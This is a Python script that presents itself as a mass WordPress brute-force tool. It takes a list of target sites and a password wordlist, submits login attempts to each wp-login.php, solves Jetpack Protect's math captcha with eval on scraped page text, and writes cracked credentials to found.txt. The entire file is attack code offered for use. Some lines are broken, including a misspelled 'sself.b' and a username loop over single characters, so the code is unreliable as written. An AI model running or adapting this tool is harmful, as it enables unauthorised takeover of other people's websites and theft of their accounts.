# Yang Recode Mati Mampuss
# Dont Recode here...
# Dosa Woyy qmakk

import requests,readline,re,os,random
from urllib.request import urlsplit
requests = requests.Session()

h = '\033[92m'
p = '\033[97m'
m = '\033[91m'
br = '\033[94m'
ua = open('sky.txt','rb').read().decode('utf8').splitlines()


__banner__ = ('''%s
──────────────────────────────────────────────────
    _ _ _ ___ ___| |_ ___ _ _| |_ ___  | Coded 
   | | | | . |___| . |  _| | |  _| -_| | by
   |_____|  _|   |___|_| |___|_| |___| | hadi
         |_|                           | prasetia
%s[+]%s Wordpress massal brute force
%s[+]%s Author: %sTampansky%s 
%s[+]%s Team: seven %sghost%s team\t\t     %sv1.0%s
──────────────────────────────────────────────────
Note : Gunakan Tools Ini dengan bijak, author tidak bertanggung jawab a.k.a tidak ikut campur dalam segala urusan pengguna nya oke.
──────────────────────────────────────────────────
\t\t\t        [%sctrl + z to exit%s]
''' % (p,h,p,h,p,h,p,h,p,h,p,h,p,m,p))

class Main():
    def __init__(self):
        os.system('clear')
        print(__banner__)
        self.v = 0
        self.sendu()
        self.u_p()
        self.crack()

    def sendu(self):
        try:
            print('\n%s[+]%s Masukkan file list site nya.!!' % (h,p))
            f = str(input('%s[-] %slist site : ' % (h,p)))
            self.site = open(f,'rb').read().decode('utf8').splitlines()
        except Exception as _er:
            quit('%s\t[info]%s%s' % (m,p,_er))

    def u_p(self):
        try:
            print('%s[+]%s Masukkan wordlist !!!' % (h,p))
            us = input('%s[-]%s user : ' % (h,p))
            pw = str(input('%s[-]%s List pass : ' % (br,p)))
            self.a = us
            self.b = open(pw,'rb').read().decode('latin').splitlines()
        except Exception as _er:
            quit('%s[info]%s%s' % (m,p,_er))

    def crack(self):
        print('%s[info]%s total site : %d' % (h,p,len(self.site)))
        print('%s[info]%s total wordlist p : %d' % (h,p,min([len(self.b)])))
        for site in self.site:
                requests.headers.update({'user-agent':random.choice(ua)})
                parse = urlsplit(site)
                netloc = parse.netloc
                scheme = parse.scheme
                print('%s[info]%s cracking : %s' % (h,p,netloc))
                for a,b in zip(self.a,sself.b):
                    try:
                        data = {}
                        url = '%s://%s/wp-login.php' % (scheme,netloc)
                        cek = requests.get(url)
                        if cek.status_code != 200:
                           print('%s[info]%s path wp-login not found ' % (m,p))
                           continue
                        for c,d in re.findall(r'name="(.*?)".*?value="(.*?)"',cek.text):
                           data.update({c:d})
                        if 'jetpack_protect_num' in cek.text.lower():
                            info = re.findall(r'\n\t\t\t\t\t(.*?)=.*?\t\t\t\t',cek.text)[0].split(' ')
                            iok = (''.join(info)).replace('x','*').replace('&nbsp;','')
                            value = str(eval(iok))
                            print('%s[info]%s User Di Curigai !!!' % (m,p))
                            print('%s[info]%s Bypass chapta %s = %s%s'  % (m,p,iok,h,value))
                            data.update({'jetpack_protect_num':value})
                        else:
                            pass
                        data.update({'log':a,'pwd':b})
                        req = requests.post(url,
                            data = data
                            ).text.lower()
                        if 'dashboard' in req:
                            self.v += 1
                            print('%s[info] %s: %s > %s + %s = success' %(h,p,url,a,b))
                            open('found.txt','a').write(url+'>  %s | %s \n' % (a,b))
                            break
                        else:
                            print('%s[info] %s%s + %s = Failed' % (m,p,a,b))
                        continue
                    except:
                        print('%s[info] %sError gan ..' % (m,p))
                        continue
        quit('%s[%s@%s]%s selesai total %s save to found.txt' % (br,m,br,p,self.v))

#___main___:
Main()